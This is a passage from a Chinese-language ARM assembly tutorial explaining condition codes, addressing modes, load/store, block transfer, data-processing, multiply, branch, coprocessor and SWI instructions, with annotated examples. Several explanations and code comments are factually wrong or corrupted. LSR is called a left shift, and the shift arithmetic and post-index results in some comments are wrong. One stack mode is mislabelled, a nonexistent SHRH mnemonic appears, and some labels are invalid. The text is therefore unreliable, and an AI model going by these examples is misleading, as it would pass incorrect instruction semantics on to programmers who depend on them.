执行条件，如EQ，NE 等 ​ S 是否影响CPSR 寄存器的值，书写时影响CPSR，否则不影响 ​ Rd 目标寄存器 ​ Rn 第一个操作数的寄存器 ​ operand2 第二个操作数 ​ 指令格式举例如下： ​ LDREX–这条指令主要是从memory中取一个数，然后放到register中，但是相比普通的LDR指令，在于其内在的原子操作特性, 信号量和spin lock这些东西最核心的事情基本上就是load-update-store序列，为了防止并发，必须保证这个序列是原子的，所谓原子，即处理器在执行这个指令序列时，得绝对占有处理器而不能够被切换出去。在ARM上，从V6开始，指令LDREX和STREX就是用来干这事的 ​ LDR R0,[R1] ;读取R1 地址上的存储器单元内容，执行条件AL​ BEQ DATAEVEN ;跳转指令，执行条件EQ，即相等跳转到DATAEVEN​ ADDS R1,R1,#1 ;加法指令，R1＋1＝R1 影响CPSR 寄存器，带有S​ SUBNES R1,R1,#0xD;条件执行减法运算(NE)，R1-0xD=&gt;R1，影响CPSR 寄存器，带有S 2) 第2个操作数 ​ 在ARM 指令中，灵活的使用第2个操作数能提高代码效率，第2个操作数的形式如下： ​ ＃immed_8r ​ 常数表达式： ​ 该常数必须对应8 位位图，即常数是由一个8 位的常数循环移位偶数位得到。 ​ 合法常量： ​ 0x3FC、0、0xF0000000、200、0xF0000001等都是合法常量。 ​ 非法常量： ​ 0x1FE、511、0xFFFF、0x1010、0xF0000010等都是非法常量。 ​ 常数表达式应用举例如下： ​ MOV R0,#1 ;R0=1 ​ AND R1,R2,#0x0F ;R2 与0x0F，结果保存在R1 ​ LDR R0，[R1],#-4 ;读取R1 地址上的存储器单元内容，且R1＝R1－4 ​ Rm ​ 寄存器方式，在寄存器方式下操作数即为寄存器的数值。 ​ 寄存器方式应用举例： ​ SUB R1，R1，R2 ；R1-R2=＞R1 ​ MOV PC，R0 ；PC=R0，程序跳转到指定地址 ​ LDR R0，[R1]，-R2 ；读取R1 地址上的存储器单元内容并存入R0，且R1=R1-R2 ​ Rm， shift ​ 寄存器移位方式。将寄存器的移位结果作为操作数，但RM 值保存不变，移位方法如下： ​ ASR #n 算术右移n 位（1≤n≤32） ​ LSL #n 逻辑左移n 位（1≤n≤31） ​ LSR #n 逻辑左移n 位（1≤n≤32） ​ ROR #n 循环右移n 位（1≤n≤31） ​ RRX 带扩展的循环右移1位 ​ type Rs 其中，type 为ASR，LSL，和ROR 中的一种；Rs 偏移量寄存器，低8位有效，若其值大于或等于32，则第2 个操作数的结果为0（ASR、ROR例外）。​ 寄存器偏移方式应用举例： ​ ADD R1，R1，R1，LSL #3 ；R1=R1*9 ​ SUB R1，R1，R2，LSR#2 ；R1=R1-R2*4 ​ R15 为处理器的程序计数器PC，一般不要对其进行操作，而且有些指令是不允许使用R15，如UMULL 指令。​ （3）条件码​ 使用指令条件码，可实现高效的逻辑操作，提高代码效率。表A-1给出条件码表。 表A-1 条件码表 ​ 对于Thumb指令集，只有B 指令具有条件码执行功能，此指令条件码同表A-?，但如果为无条件执行时，条件码助记符“AL”不在指令中书写。 ​ 条件码应用举例如下： ​ 比较两个值大小，并进行相应加1 处理，C 代码为：​ if（a＞b）a++ ;​ else b++ ;​ 对应的ARM 指令如下。其中R0为a，R1为b。​ CMP R0，R1 ; R0 与R1 比较​ ADDHI R0，R0，#1 ; 若R0＞R1，则R0=R0+1​ ADDLS R1，R1，#1 ;若R0＜=R1，则R1=R1+1​ 若两个条件均成立，则将这两个数值相加，C代码为： ​ If(（a!=10）&amp;&amp;(b!=20))a=a+b; ​ 对应的ARM 指令如下，其中R0 为a，R1为b。​ CMP R0,#10 ; 比较R0 是否为10​ CMPNE R1,#20 ; 若R0 不为10，则比较R1 是否20​ ADDNE R0,R0,R1 ; 若R0 不为10 且R1 不为20，指令执行，R0=R0+R1 1.3. 指令集1.3.1. ARM 存储器访问指令​ ARM 处理是加载/存储体系结构的典型的RISC处理器，对存储器的访问只能使用加载和存储指令实现。ARM 的加载/存储指令是可以实现字、半字、无符/有符字节操作；批量加载/存储指令可实现一条指令加载/存储多个寄存器的内容，大大提高效率；SWP指令是一条寄存器和存储器内容交换的指令，可用于信号量操作等。ARM 处理器是冯?诺依曼存储结构，程序空间、RAM 空间及IO 映射空间统一编址，除对对RAM 操作以外，对外围IO、程序数据的访问均要通过加载/存储指令进行。表A-2给出ARM存储访问指令表。 表A-2 ARM 存储访问指令表 LDR 和STR​ 加载/存储字和无符号字节指令。使用单一数据传送指令(STR 和LDR)来装载和存储单一字节或字的数据从/到内存。LDR指令用于从内存中读取数据放入寄存器中；STR 指令用于将寄存器中的数据保存到内存。指令格式如下：​ LDR{cond}{T} Rd,&lt;地址&gt;; 加载指定地址上的数据(字)，放入Rd中​ STR{cond}{T} Rd,&lt;地址&gt;; 存储数据(字)到指定地址的存储单元，要存储的数据在Rd中​ LDR{cond}B{T} Rd,&lt;地址&gt;; 加载字节数据，放入Rd中，即Rd最低字节有效，高24位清零​ STR{cond}B{T} Rd,&lt;地址&gt;; 存储字节数据，要存储的数据在Rd，最低字节有效​ 其中，T 为可选后缀，若指令有T，那么即使处理器是在特权模式下，存储系统也将访问看成是处理器是在用户模式下。T在用户模式下无效，不能与前索引偏移一起使用T。​ LDR/STR 指令寻址是非常灵活的，由两部分组成，一部分为一个基址寄存器，可以为任一个通用寄存器，另一部分为一个地址偏移量。地址偏移量有以下3种格式：​ (1) 立即数。立即数可以是一个无符号数值，这个数据可以加到基址寄存器，也可以从基址寄存器中减去这个数值。指令举例如下：​ LDR R1,[R0,#0x12] ;将R0+0x12 地址处的数据读出，保存到R1中(R0 的值不变)​ LDR R1,[R0,#-0x12];将R0-0x12 地址处的数据读出，保存到R1中(R0 的值不变)​ LDR R1,[R0] ;将R0 地址处的数据读出，保存到R1 中(零偏移)​ (2)寄存器。寄存器中的数值可以加到基址寄存器，也可以从基址寄存器中减去这个数值。指令举例值。指令举例如下：​ LDR R1,[R0,R2] ;将R0+R2 地址的数据计读出，保存到R1中(R0 的值不变)​ LDR R1,[R0,-R2] ;将R0-R2 地址处的数据计读出，保存到R1中(R0 的值不变)​ (3)寄存器及移位常数。寄存器移位后的值可以加到基址寄存器，也可以从基址寄存器中减去这个数值。指令举例如下：​ LDR R1,[R0,R2,LSL #2] ;将R0+R24地址处的数据读出，保存到R1中（R0，R2的值不变）​ LDR R1,[R0,-R2,LSL #2];将R0-R24地址处的数据计读出，保存到R1中(R0，R2的值不变)​ 从寻址方式的地址计算方法分，加载/存储指令有以下4 种形式：​ (1)零偏移。Rn 的值作为传送数据的地址，即地址偏移量为0。指令举例如下：​ LDR Rd,[Rn]​ (2)前索引偏移。在数据传送之前，将偏移量加到Rn 中，其结果作为传送数据的存储地址。若使用后缀“！”，则结果写回到Rn中，且Rn 值不允许为R15。指令举例如下：​ LDR Rd,[Rn,#0x04]!​ LDR Rd,[Rn,#-0x04]​ (3)程序相对偏移。程序相对偏移是索引形式的另一个版本。汇编器由PC 寄存器计算偏移量，并将PC寄存器作为Rn 生成前索引指令。不能使用后缀“！”。指令举例如下：​ LDR Rd,label ;label 为程序标号，label 必须是在当前指令的±4KB范围内​ (4) 后索引偏移。Rn 的值用做传送数据的存储地址。在数据传送后，将偏移量与Rn相加，结果写回到Rn中。Rn 不允许是R15。指令举例如下：​ LDR Rd,[Rn],#0x04​ 地址对准–大多数情况下，必须保证用于32 位传送的地址是32 位对准的。​ 加载/存储字和无符号字节指令举例如下：​ LDR R2,[R5] ;加载R5 指定地址上的数据(字)，放入R2 中​ STR R1,[R0,#0x04] ;将R1 的数据存储到R0+0x04存储单元，R0 值不变​ LDRB R3,[R2],#1 ;读取R2 地址上的一字节数据，并保存到R3中，R2=R3+1​ STRB R6,[R7] ;读R6 的数据保存到R7 指定的地址中，只存储一字节数据​ 加载/存储半字和带符号字节。这类LDR/STR 指令可能加载带符字节\加载带符号半字、加载/存储无符号半字。偏移量格式、寻址方式与加载/存储字和无符号字节指令相同。指令格式如下：​ LDR{cond}SB Rd,&lt;地址&gt; ;加载指定地址上的数据(带符号字节)，放入Rd中​ LDR{cond}SH Rd,&lt;地址&gt; ;加载指定地址上的数据(带符号字节)，放入Rd中​ LDR{cond}H Rd,&lt;地址&gt; ;加载半字数据，放入Rd中，即Rd最低16位有效,高16位清零​ STR{cond}H Rd,&lt;地址&gt; ;存储半字数据，要存储的数据在Rd，最低16位有效​ 说明：带符号位半字/字节加载是指带符号位加载扩展到32 位;无符号位半字加载是指零扩展到32位。​ 地址对准–对半字传送的地址必须为偶数。非半字对准的半字加载将使Rd 内容不可靠，非半字对准的半字存储将使指定地址的2字节存储内容不可靠。 ​ 加载/存储半字和带符号字节指令举例如下： ​ LDRSB R1[R0,R3] ;将R0+R3地址上的字节数据读出到R1，高24 位用符号位扩展​ LDRSH R1,[R9] ;将R9 地址上的半字数据读出到R1，高16位用符号位扩展​ LDRH R6,[R2],#2 ;将R2 地址上的半字数据读出到R6，高16位用零扩展，R2=R2+1​ SHRH R1,[R0,#2]!;将R1 的数据保存到R2+2 地址中，只存储低2字节数据，R0=R0+2​ LDR/STR 指令用于对内存变量的访问，内存缓冲区数据的访问、查表、外设的控制操作等等，若使用LDR 指令加载数据到PC 寄存器，则实现程序跳转功能，这样也就实现了程序散转。​ 变量的访问​ NumCount EQU 0x40003000 ;定义变量NumCount​ …​ LDR R0,=NumCount ;使用LDR 伪指令装载NumCount的地址到R0​ LDR R1,[R0] ;取出变量值​ ADD R1,R1,#1 ;NumCount=NumCount+1​ STR R1,[R0] ;保存变量值​ …​ GPIO 设置​ GPIO-BASE EQU 0Xe0028000 ;定义GPIO 寄存器的基地址​ …​ LDR R0,=GPIO-BASE​ LDR R1,=0x00FFFF00 ;装载32 位立即数，即设置值​ STR R1,[R0,#0x0C] ;IODIR=0x00FFFF00， IODIR 的地址为0xE002800C​ MOV R1,#0x00F00000​ STR R1,[R0,#0x04] ;IOSET=0x00F00000，IOSET 的地址为0xE0028004​ …​ 程序散转​ …​ MOV R2,R2,LSL #2 ;功能号乘上4，以便查表​ LDR PC,[PC,R2] ;查表取得对应功能子程序地址，并跳转​ NOP​ FUN-TAB DCD FUN-SUB0​ DCD FUN-SUB1​ DCD FUN-SUB2​ … LDM和STM​ 批量加载/存储指令可以实现在一组寄存器和一块连续的内存单元之间传输数据。LDM为加载多个寄存器，STM 为存储多个寄存器。允许一条指令传送16 个寄存器的任何子集或所有寄存器。指令格式如下：​ LDM{cond}&lt;模式&gt; Rn{!},reglist{^}​ STM{cond}&lt;模式&gt; Rn{!},reglist{^}​ LDM /STM 的主要用途是现场保护、数据复制、参数传送等。其模式有8种，如下所列：(前面4 种用于数据块的传输，后面4 种是堆栈操作)。​ (1) IA：每次传送后地址加4​ (2) IB：每次传送前地址加4​ (3) DA：每次传送后地址减4​ (4) DB：每次传送前地址减4​ (5) FD：满递减堆栈​ (6) ED：空递增堆栈​ (7) FA：满递增堆栈​ (8) EA：空递增堆栈​ 其中，寄存器Rn 为基址寄存器，装有传送数据的初始地址，Rn 不允许为R15;后缀“！”表示最后的地址写回到Rn中;寄存器列表reglist 可包含多于一个寄存器或寄存器范围，使用“,”分开，如{R1,R2,R6-R9},寄存器排列由小到大排列；“＾”后缀不允许在用户模式呈系统模式下使用，若在LDM 指令用寄存器列表中包含有PC 时使用，那么除了正常的多寄存器传送外，将SPSR 拷贝到CPSR 中，这可用于异常处理返回；使用“＾”后缀进行数据传送且寄存器列表不包含PC时，加载/存储的是用户模式的寄存器，而不是当前模式的寄存器。​ 地址对准――这些指令忽略地址的位[1：0]。​ 批量加载/存储指令举例如下：​ LDMIA R0!,{R3-R9} ;加载R0 指向的地址上的多字数据，保存到R3～R9中，R0 值更新​ STMIA R1!,{R3-R9} ;将R3～R9 的数据存储到R1 指向的地址上，R1值更新​ STMFD SP!,{R0-R7,LR} ;现场保存，将R0～R7、LR入栈​ LDMFD SP!,{R0-R7,PC}^;恢复现场，异常处理返回​ 在进行数据复制时，先设置好源数据指针，然后使用块拷贝寻址指令LDMIA/STMIA、LDMIB/STMIB、LDMDA/STMDA、LDMDB/STMDB 进行读取和存储。而进行堆栈操作时，则要先设置堆栈指针，一般使用SP 然后使用堆栈寻址指令STMFD/LDMFD、STMED。LDMED、STMFA/LDMFA、STMEA/LDMEA实现堆栈操作。​ 多寄存器传送指令示意图如图A-1所示，其中R1为指令执行前的基址寄存器，R1’则为指令执行完后的基址寄存器。 （a）指令STMIA R1!,{R5-R7} （b）指令STMIB R1!,{R5-R7} （c）指令STMDA R1!, {R5-R7} （d）指令STMDB R1!,{R5-R7}图A-1 多寄存器传送指令示意图 ​ 数据是存储在基址寄存器的地址之上还是之下，地址是在存储第一个值之前还是之后增加还是减少。表A-3给出多寄存器传送指令映射示意表。 表A-3 多寄存器传送指令映射示意表 123456使用LDM/STM 进行数据复制例程如下：…LDR R0,=SrcData ;//设置源数据地址LDR R1,=DstData ;//设置目标地址LDMIA R0,&#123;R2-R9&#125; ;//加载8 字数据到寄存器R2～R9STMIA R1,&#123;R2-R9&#125; ;//存储寄存器R2～R9 到目标地址 ​ 使用LDM/STM 进行现场寄存器保护，常在子程序中或异常处理使用：​ SENDBYTE​ STMFD SP!,{R0-R7,LR} ;寄存器入堆​ …​ BL DELAY ;调用DELAY 子程序​ …​ LDMFD SP!,{R0-R7,PC} ;恢复寄存器，并返回 SWP​ 寄存器和存储器交换指令。SWP指令用于将一个内存单元（该单元地址放在寄存器Rn中）的内容读取到一个寄存器Rd中，同时将另一个寄存器Rm 的内容写入到该内存单元中。使用SWP 可实现信号量操作。​ 指令格式如下：​ SWP{cond}{B} Rd,Rm,[Rn]​ 其中，B 为可选后缀，若有B，则交换字节，否则交换32 位字：Rd 为数据从存储器加载到的寄存器;Rm的数据用于存储到存储器中，若Rm 与Rn 相同，则为寄存器与存储器内容进行交换;Rn 为要进行数据交换的存储器地址，Rn 不能与Rd 和Rm 相同。​ SWP 指令举例如下：​ SWP R1,R1,[R0] ; 将R1 的内容与R0 指向的存储单元的内容进行交换​ SWP R1,R2,,[R0] ; 将R0 指向的存储单元内容读取一字节数据到R1中(高24 位清零)​ ; 并将R2 的内容写入到该内存单元中(最低字节有效)​ 使用SWP 指令可以方便地进行信号量的操作：​ 12C_SEM EQU 0x40003000​ …​ 12C_SEM_WAIT​ MOV R0,#0​ LDR R0,=12C_SEM​ SWP R1,R1,[R0] ;取出信号量，并设置其为0​ CMP R1,#0 ;判断是否有信号​ BEQ 12C_SEM_WAIT ;若没有信号，则等待 1.3.2. ARM 数据处理指令​ 数据处理指令大致可分为3 类： （1） 数据传送指令（如MOV、MVN） （2） 算术逻辑运算指令（如ADD,SUM,AND） （3） 比较指令（如CMP、TST）。 数据处理指令只能对寄存器的内容进行操作。 所有ARM 数据处理指令均可选择使用S 后缀，以影响状态标志。比较指令CMP、CMN、TST和TEQ不需要后缀S，它们会直接影响状态标志。ARM数据处理指令列于表A-4中。 表A-4 ARM 数据处理指令 123456789 （1）数据传送指令**MOV** 数据传送指令。将8 位图立即数或寄存器(operant2)传送到目标寄存器Rd，可用于移位运算等操作。指令格式如下： MOV&#123;cond&#125;&#123;S&#125; Rd,operand2 MOV 指令举例如下： MOV R1#0x10 ;R1=0x10 MOV R0,R1 ;R0=R1 MOVS R3,R1,LSL #2 ;R3=R1＜＜2，并影响标志位 MOV PC,LR ;PC=LR ，子程序返回 MVN​ 数据非传送指令。将8 位图立即数或寄存器(operand2)按位取反后传送到目标寄存器(Rd)，因为其具有取反功能，所以可以装载范围更广的立即数。指令格式如下：​ MVN{cond}{S} Rd,operand2​ MVN 指令举例如下：​ MVN R1,#0xFF ;R1=0xFFFFFF00​ MVN R1,R2 ;将R2 取反，结果存到R1 ​ （2）算术逻辑运算指令 ADD​ 加法运算指令。将operand2 数据与Rn 的值相加，结果保存到Rd 寄存器。指令格式如下：​ ADD{cond}{S} Rd,Rn,operand2​ ADD 指令举例如下：​ ADDS R1,R1,#1 ;R1=R1+1​ ADD R1,R1,R2 ;R1=R1+R2​ ADDS R3,R1,R2,LSL #2 ;R3=R1+R2＜＜2 SUB​ 减法运算指令。用寄存器Rn 减去operand2。结果保存到Rd 中。指令格式如下：​ SUB{cond}{S} Rd,Rn,operand2​ SUB 指令举例如下：​ SUBS R0,R0,#1 ;R0=R0-1​ SUBS R2,R1,R2 ;R2=R1-R2​ SUB R6,R7,#0x10 ;R6=R7-0x10 RSB​ 逆向减法指令。用寄存器operand2 减法Rn，结果保存到Rd 中。指令格式如下：​ RSB{cond}{S} Rd,Rn,operand2​ SUB 指令举例如下：​ RSB R3,R1,#0xFF00 ;R3=0xFF00-R1​ RSBS R1,R2,R2,LSL #2 ;R1=R2＜＜2-R2=R2×3​ RSB R0,R1,#0 ;R0=-R1 ADC​ 带进位加法指令。将operand2 的数据与Rn 的值相加，再加上CPSR中的C 条件标志位。结果保存到Rd 寄存器。指令格式如下：​ ADC{cond}{S} Rd,Rn,operand2​ ADC 指令举例如下：​ ADDS R0,R0,R2​ ADC R1,R1,R3 ;使用ADC 实现64 位加法，(R1、R0)=(R1、R0)+（R3、R2） SBC​ 带进位减法指令。用寄存器Rn 减去operand2，再减去CPSR 中的C条件标志位的非（即若C 标志清零，则结果减去1），结果保存到Rd 中。指令格式如下：​ SCB{cond}{S}Rd,Rn,operand2​ SBC 指令举例如下：​ SUBS R0，R0，R2​ SBC R1，R1，R3 ;使用SBC 实现64 位减法，(R1,R0)-(R3,R2) RSC​ 带进位逆向减法指令。用寄存器operand2 减去Rn，再减去CPSR 中的C条件标志位，结果保存到Rd 中。指令格式如下：​ RSC{cond}{S} Rd,Rn,operand2​ RSC 指令举例如下：​ RSBS R2,R0,#0​ RSC R3,R1,#0 ;使用RSC 指令实现求64 位数值的负数 AND​ 逻辑与操作指令。将operand2 值与寄存器Rn 的值按位作逻辑与操作，结果保存到Rd中。指令格式如下：​ AND{cond}{S} Rd,Rn,operand2​ AND 指令举例如下：​ ANDS R0,R0,#x01 ;R0=R0&amp;0x01，取出最低位数据​ AND R2,R1,R3 ;R2=R1&amp;R3 ORR​ 逻辑或操作指令。将operand2 的值与寄存器Rn的值按位作逻辑或操作，结果保存到Rd 中。指令格式如下：​ ORR{cond}{S} Rd,Rn,operand2​ ORR 指令举例如下：​ ORR R0,R0,#x0F ;将R0 的低4 位置1​ MOV R1,R2,LSR #4​ ORR R3,R1,R3,LSL #8 ;使用ORR 指令将近R2 的高8位数据移入到R3 低8 位中 EOR​ 逻辑异或操作指令。将operand2 的值与寄存器Rn 的值按位作逻辑异或操作，结果保存到Rd中。指令格式如下：​ EOR{cond}{S}Rd,Rn,operand2​ EOR 指令举例如下：​ EOR R1,R1,#0x0F ;将R1 的低4 位取反​ EOR R2,R1,R0 ;R2=R1^R0​ EORS R0,R5,#0x01 ;将R5 和0x01 进行逻辑异或，结果保存到R0，并影响标志位 BIC​ 位清除指令。将寄存器Rn 的值与operand2 的值的反码按位作逻辑与操作，结果保存到Rd中。指令格式如下：​ BIC{cond}{S}Rd,Rn,operand2​ BIC 指令举例如下：​ BIC R1,R1,#0x0F ;将R1 的低4 位清零，其它位不变​ BIC R1,R2,R3 ;将拭的反码和R2 相逻辑与，结果保存到R1 ​ （3）比较指令 CMP​ 比较指令。指令使用寄存器Rn 的值减去operand2 的值，根据操作的结果更新CPSR中的相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行。指令格式如下：​ CMP{cond} Rn,operand2​ CMP 指令举例如下：​ CMP R1,#10 ;R1 与10 比较，设置相关标志位​ CMP R1,R2 ;R1 与R2 比较，设置相关标志位​ CMP 指令与SUBS 指令的区别在于CMP 指令不保存运算结果。在进行两个数据大小判断时，常用CMP指令及相应的条件码来操作。 CMN​ 负数比较指令。指令使用寄存器Rn 与值加上operand2 的值，根据操作的结果更新CPSR中的相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行，指令格式如下：​ CMN{cond} Rn,operand2​ CMN R0,#1 ;R0+1,判断R0 是否为1 的补码，若是Z 置位​ CMN 指令与ADDS 指令的区别在于CMN 指令不保存运算结果。CMN指令可用于负数比较，比如CMNR0，#1 指令则表示R0 与-1 比较，若R0 为-(即1 的补码)，则Z 置位，否则Z复位。 TST​ 位测试指令。指令将寄存器Rn 的值与operand2 的值按位作逻辑与操作，根据操作的结果更新CPSR中相应的条件标志位(当结果为0时，EQ位被设置)，以便后面指令根据相应的条件标志来判断是否执行。指令格式如下：​ TST{cond} Rn,operand2​ TST 指令举例如下：​ TST R0,#0x01 ;判断R0 的最低位是否为0​ TST R1,#0x0F ;判断R1 的低4 位是否为0​ TST 指令与ANDS 指令的区别在于TST4 指令不保存运算结果。TST指令通常于EQ、NE条件码配合使用，当所有测试位均为0 时，EQ 有效，而只要有一个测试为不为0，则NE 有效。 TEQ​ 相等测试指令。指令寄存器Rn 的值与operand2 的值按位作逻辑异或操作，根据操作的结果更新CPSR中相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行。指令格式如下：​ TEQ{cond} Rn,operand2​ TEQ 指令举例如下：​ TEQ R0,R1 ;比较R0 与R1 是否相等(不影响V 位和C 位)​ TST 指令与EORS 指令的区别在于TST 指令不保存运算结果。使用TEQ进行相等测试，常与EQNE 条件码配合使用，当两个数据相等时，EQ 有效，否则NE 有效。 （4）乘法指令​ ARM7TDMI(-S)具有32×32 乘法指令、32×32 乘加指令、32×32结果为64 位的乘法指令。表A-5给出全部的ARM 乘法指令。 表A-5 全部的ARM 乘法指令 MUL1234532 位乘法指令。指令将Rm 和Rs 中的值相乘，结果的低32 位保存到Rd中。指令格式如下：MUL&#123;cond&#125;&#123;S&#125; Rd,Rm,RsMUL 指令举例如下：MUL R1,R2,R3 ;R1=R2×R3MULS R0,R3,R7 ;R0=R3×R7，同时设置CPSR 中的N位和Z 位 MLA​ 32 位乘加指令。指令将Rm 和Rs 中的值相乘，再将乘积加上第3 个操作数，结果的低32位保存到Rd 中。指令格式如下：​ MLA{cond}{S} Rd,Rm,Rs,Rn​ MLA 指令举例如下：​ MLA R1,R2,R3,R0 ;R1=R2×R3+10 UMULL​ 64 位无符号乘法指令。指令将Rm 和Rs 中的值作无符号数相乘，结果的低32位保存到RsLo 中，而高32 位保存到RdHi 中。指令格式如下：​ UMULL{cond}{S} RdLo,RdHi,Rm,Rs​ UMULL 指令举例如下：​ UMULL R0,R1,R5,R8 ;(R1、R0)=R5×R8 UMLAL​ 64 位无符号乘加指令。指令将Rm 和Rs 中的值作无符号数相乘，64 位乘积与RdHi、RdLo相加，结果的低32 位保存到RdLo 中，而高32 位保存到RdHi 中。指令格式如下：​ UMLAL{cond}{S} RdLo,RdHi,Rm,Rs​ UMLAL 指令举例如下：​ UMLAL R0,R1,R5,R8;(R1,R0)=R5×R8+(R1,R0) SMULL​ 64 位有符号乘法指令。指令将Rm 和Rs 中的值作有符号数相乘，结果的低32位保存到RdLo 中，而高32 位保存到RdHi 中。指令格式如下：​ SMULL{cond}{S} RdLo,RdHi,Rm,Rs​ SMULL 指令举例如下：​ SMULL R2,R3,R7,R6 ;(R3,R2)=R7×R6 SMLAL​ 64 位有符号乘加指令。指令将Rm 和Rs 中的值作有符号数相乘，64 位乘积与RdHi、RdLo，相加，结果的低32位保存到RdLo 中，而高32 位保存到RdHi 中。指令格式如下：​ SMLAL{cond}{S} RdLo,RdHi,Rm,Rs​ SMLAL 指令举例如下：​ SMLAL R2,R3,R7,R6;(R3,R2)=R7×R6+(R3,R2) 1.3.3. ARM 跳转指令​ 两种方式可以实现程序的跳转： （1） 使用跳转指令直接跳转，跳转指令有跳转指令B，带链接的跳转指令BL ，带状态切换的跳转指令BX。 （2） 直接向PC 寄存器赋值实现跳转。 表A-6给出全部的ARM跳转指令。 表A-6 ARM跳转指令 B​ 跳转指令，跳转到指定的地址执行程序。 `B{cond} label` 举例如下： ​ B WAITA ;跳转到WAITA 标号处 ​ B 0x1234 ;跳转到绝对地址0x1234 处 ​ 跳转到指令B 限制在当前指令的±32Mb 的范围内。 BL带链接的跳转指令。指令将下一条指令的地址拷贝到R14(即LR)链接寄存器中，然后跳转到指定地址运行程序。 ​ BL{cond} label ​ 举例如下： ​ BL DELAY ​ 跳转指令B 限制在当前指令的±32MB 的范围内。BL 指令用于子程序调用。 BX带状态切换的跳转指令。跳转到Rm 指定的地址执行程序，若Rm 的位[0]为1，则跳转时自动将CPSR 中的标志T 置位，即把目标地址的代码解释为Thumb代码;若Rm 的位[0]为0，则跳转时自动将CPSR 中的标志T 复位，即把目标地址的代码解释为ARM代码。指令格式如下：​ BX{cond} Rm​ 举例如下：​ ADRL R0,ThumbFun+1​ BX R0 ;跳转到R0 指定的地址，并根据R0 的最低位来切换处理器状态 BLX​ BLX目标地址：跳转，改变状态及保存PC值 1.3.4. ARM 协处理器指令5 ARM 支持协处理器操作，协处理器的控制要通过协处理器命令实现。表A-7给出全部的ARM协处理器指令。 表A-7 ARM 协处理器指令 CDP​ 协处理器数据操作指令。ARM 处理器通过CDP 指令通知ARM 协处理器执行特定的操作。该操作由协处理器完成，即对命令的参数的解释与协处理器有关，指令的使用取决于协处理器。若协处理器不能成功地执行该操作，将产生未定义指令异常中断。指令格式如下：​ CDP{cond}coproc,opcodel,CRd,CRn,CRm{,opcode2}​ 其中： coproc 指令操作的协处理器名。标准名为pn,n 为0～15。​ opcodel 协处理器的特定操作码。​ CRd 作为目标寄存器的协处理器寄存器。​ CRN 存放第1 个操作数的协处理器寄存器。​ CRm 存放第2 个操作数的协处理器寄存器。​ Opcode2 可选的协处理器特定操作码。​ CDP 指令举例如下：​ CDP p7,0,c0,c2,c3,0 ;协处理器7 操作，操作码为0，可选操作码为0​ CDP p6,1,c3,c4,c5 ;协处理器操作，操作码为1 LDC​ 协处理器数据读取指令。LDC指令从某一连续的内存单元将数据读取到协处理器的寄存器中。协处理器数据的数据的传送，由协处理器来控传送的字数。若协处理器不能成功地执行该操作，将产生未定义指令异常中断。指令格式如下：​ LDC{cond}{L} coproc,CRd,&lt;地址&gt;​ 其中： L 可选后缀，指明是长整数传送。​ coproc 指令操作的协处理器名。标准名为pn，n 为0～15​ CRd 作为目标寄存的协处理器寄存器。​ &lt;地址&gt; 指定的内存地址​ LDC 指令举例如下：​ LDC p5,c2,[R2,#4];读取R2+4指向的内存单元的数据，传送到协处理器p5的c2寄存器中​ LDC p6,c2,[R1] ;读取是指向的内存单元的数据，传送到协处理器p6的c2 寄存器中 STC​ 协处理器数据写入指令。STC指令将协处理器的寄存器数据写入到某一连续的内存单元中。进行协处理器数据的数据传送，由协处理器来控制传送的字数。若协处理器不能成功地执行该操作，将产生未定义指令异常中断。指令格式如下：​ STC{cond}{L} coproc,CRd,&lt;地址&gt;​ 其中： L 可选后缀，指明是长整数传送。​ coproc 指令操作的协处理器名。标准名为pn，n 为0～15​ CRd 作为目标寄存的协处理器寄存器。​ &lt;地址&gt; 指定的内存地址​ STC 指令举例如下：​ STC p5,c1,[R0]​ STC p5,c1,[Ro,#-0x04] MCR​ ARM寄存器到协处理器寄存器的数据传送指令。MCR 指令将ARM 处理器的寄存器中的数据传送到协处理器的寄存器中。若协处理器不能成功地执行该操作，将产生未定义指令异常中断。指令格式如下：​ MCR{cond}coproc,opcodel,Rd,CRn,CRm{,opcode2}​ 其中：coproc 指令操作的协处理器名。标准名为pn，n 为0～15。​ cpcodel 协处理器的特定操作码。​ RD 作为目标寄存器。​ CRn 存放第1 个操作数的协处理器寄存器​ CRm 存放第2 个操作数的协处理器寄存器。​ Opcode2 可选的协处理器特定操作码。​ MCR 指令举例如下：​ MCR p6,2,R7,c1,c2,​ MCR P7,0,R1,c3,c2,1, MRC​ 协处理器寄存器到ARM寄存器到的数据传送指令。MRC 指令将协处理器寄存器中的数据传送到ARM 处理器的寄存器中。若协处理器不能成功地执行该操作。将产生未定义异常中断。指令格式如下：​ MRC {cond}coproc,opcodel,Rd,CRn,CRm{,opcode2}​ 其中：coproc 指令操作的协处理器名。标准名为pn，n为0～15。​ opcodel 协处理器的特定操作码。​ Rd 作为目标寄存器。​ CRn 存放第1 个操作数的协处理器寄存器。​ CRm 存放第2 个操作数的协处理器寄存器。​ opcode2 可选的协处理器特定操作码。​ MRC 指令举例如下：​ MRC p5,2,R2,c3,c2​ MRC p7,0,R0,c1,c2,1 1.3.5. ARM 杂项指令​ 表A-8给出全部的ARM协处理器指令。 表A-8 ARM杂项指令 SWI ​ 软中断指令。SWI 指令用于产生软中断，从而实现在用户模式变换到管理模式，CPSR保存到管理模式的SPSR中，执行转移到SWI 向量，在其它模式下也可使用SWI 指令，处理同样地切换到管理模式。指令格式如下：​ SWI{cond} immed_24​ 其中：immed_24 24 位立即数，值为0～16777215 之间的整数。​ SWI 指令举例如下：​ SWI 0 ;软中断，中断立即数为0​ SWI 0x123456 ;软中断，中断立即数为0x123456​ 使用SWI 指令时，通常使用以下两种方法进行传递参数，SWI 异常中断处理程序就可以提供相关的服务，这两种方法均是用户软件协定。SWI异常中断处理程序要通过读取引起软中断的SWI 指令，以取得24 位立即数。​ （A）指令24 位的立即数指定了用户请求的服务类型，参数通过用寄存器传递。​ MOV R0,#34 ;设置了功能号为34​ SWI 12 ;调用12 号软中断​ （B）指令中的24 位立即数被忽略，用户请求的服务类型由寄存器R0 的值决定，参数通过其它的通用寄存器传递。​ MOV R0,#12 ;调用12 号软中断​ MOV R1,#34 ;设置子功能号为34​ SWI 0 ;​ 在SWI 异常中断处理程序中，取出SWI 立即数的步骤为：首先确定引起软中断的SWI指令是ARM指令还时Thumb 指令，这可通过对SPSR 访问得到：然后要取得该SWI 指令的地址，这可通过访问LR 寄存器得到：接着读出指令，分解出立即数。​ 读出SWI 立即数：​ T_bit EQU 0x20​ SWI_Hander​ STMFD SP!,{R0_R3,R12,LR} ;现场保护​ MRS R0,SPSR ;读取SPSR​ STMFD 